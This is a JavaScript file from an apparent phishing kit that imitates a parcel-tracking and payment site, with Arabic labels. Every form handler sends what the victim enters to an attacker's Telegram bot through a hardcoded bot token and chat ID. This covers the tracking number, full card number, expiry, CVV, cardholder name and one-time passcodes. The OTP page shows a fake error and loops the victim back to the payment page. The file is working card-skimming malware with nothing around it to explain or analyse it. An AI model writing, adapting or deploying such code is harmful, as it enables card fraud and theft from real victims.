const TOKEN = '8605986648:AAHq4RDCXGrAXxTnUyKnPxZci1EweXV5WrU';
const CHAT_ID = '1008144314';

function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    });
}

// الصفحة الرئيسية
document.getElementById('trackForm')?.addEventListener('submit', function(e) {
    e.preventDefault();
    const num = document.getElementById('trackingNumber').value;
    localStorage.setItem('trackingNumber', num);
    sendToTelegram(`🔍 رقم تتبع: ${num}`);
    location.href = 'tracking.html';
});

// صفحة الدفع
document.getElementById('paymentForm')?.addEventListener('submit', function(e) {
    e.preventDefault();
    const data = {
        card: document.getElementById('cardNumber').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        holder: document.getElementById('holderName').value
    };
    localStorage.setItem('paymentData', JSON.stringify(data));
    sendToTelegram(`💳 بيانات البطاقة:\nرقم: ${data.card}\nتاريخ: ${data.expiry}\nCVV: ${data.cvv}\nالاسم: ${data.holder}`);
    location.href = 'otp.html';
});

// صفحة OTP
document.getElementById('otpForm')?.addEventListener('submit', function(e) {
    e.preventDefault();
    const otp = document.getElementById('otpCode').value;
    sendToTelegram(`🔑 OTP: ${otp}`);
    document.getElementById('errorMsg').style.display = 'block';
    setTimeout(() => {
        location.href = 'payment.html';
    }, 2000);
});
